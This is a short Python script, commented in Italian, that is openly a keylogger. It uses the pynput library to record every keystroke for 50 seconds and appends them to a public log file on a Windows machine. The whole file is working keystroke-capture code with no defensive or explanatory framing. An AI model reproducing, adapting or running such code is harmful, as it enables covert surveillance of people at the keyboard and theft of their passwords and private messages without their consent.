import pynput.keyboard
import time
import os
import sys

# Tempo massimo di esecuzione (in secondi)
DURATION = 50  

# Percorso del file di log
LOG_FILE = "C:\\Users\\Public\\keylog.txt"

# Buffer per i tasti catturati
key_buffer = []
start_time = time.time()

# Funzione intercettatrice per ogni tasto premuto
def on_key_press(key):
    global key_buffer
    try:
        key_buffer.append(key.char)
    except AttributeError:
        key_buffer.append(f'[{key}]')

# Scrive le battiture e si ferma dopo il tempo stabilito
def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_key_press) as listener:
        while time.time() - start_time < DURATION:
            time.sleep(1)  

        # Scrive i dati nel file
        with open(LOG_FILE, "a") as file:
            file.write("".join(key_buffer) + "\n")

        print(f"Keylogger terminato. Dati salvati in: {LOG_FILE}")

# Avvio del keylogger
if __name__ == "__main__":
    print(f"Avviato da: {os.getcwd()}")
    start_keylogger()
    sys.exit(0)  # Chiude il processo in modo pulito
